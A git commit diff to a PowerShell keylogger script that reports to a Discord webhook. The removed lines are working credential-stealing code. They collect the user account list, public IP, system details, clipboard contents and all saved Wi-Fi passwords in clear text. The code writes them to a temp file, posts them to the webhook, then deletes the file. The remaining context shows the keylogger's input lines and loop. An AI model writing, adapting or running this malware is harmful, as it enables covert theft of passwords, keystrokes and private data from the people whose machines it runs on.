a4a0d8384cc6026484f57034b9e2729ec8e4cedb
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-07-17 11:06:53 +0000

    Update LogKeys to Discord.ps1

--- Discord Scripts/LogKeys to Discord.ps1
+++ Discord Scripts/LogKeys to Discord.ps1
@@ -1,4 +1,5 @@
 ﻿
+
 <#
 ============================================= Key Record Script ========================================================
 
@@ -12,56 +13,12 @@ USAGE
 
 #>
 
-Do{
 #===================== INPUT CREDENTIALS HERE =====================
 
 $RunTimeP = 10 # Interval (in minutes) between each email
 $whuri = "DISCORD_WEBHOOK_HERE"
 
 #==================================================================
-
-$userString = "Username: $($userInfo.Name)"
-$userString += "`nFull Name: $($userInfo.FullName)`n"
-$userString+="Public Ip Address = "
-$userString+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
-$userString+="`n"
-$userString+="All User Accounts: `n"
-$userString+= Get-WmiObject -Class Win32_UserAccount
-$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
-$biosInfo = Get-WmiObject -Class Win32_BIOS
-$processorInfo = Get-WmiObject -Class Win32_Processor
-$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
-$userInfo = Get-WmiObject -Class Win32_UserAccount
-$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
-$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
-$systemString += "`nProcessor: $($processorInfo.Name)"
-$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
-$systemString += "`nComputer Name: $($computerSystemInfo.Name)"
-
-$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
-$wifistring+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;}
-"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
-$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"---------------------   CLIPBOARD INFO  -------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-"------------------------  WIFI INFO    --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
-
-$wifistring = " "
-$Pathsys = "$env:temp\systeminfo.txt"
-$msgsys = Get-Content -Path $Pathsys -Raw 
-$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-$jsonsys = @{"username" = "$env:COMPUTERNAME" 
-            "content" = $escmsgsys} | ConvertTo-Json
-Start-Sleep 1
-Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
-Remove-Item -Path $Pathsys -force
-
 
 Do{
 $apip = 1
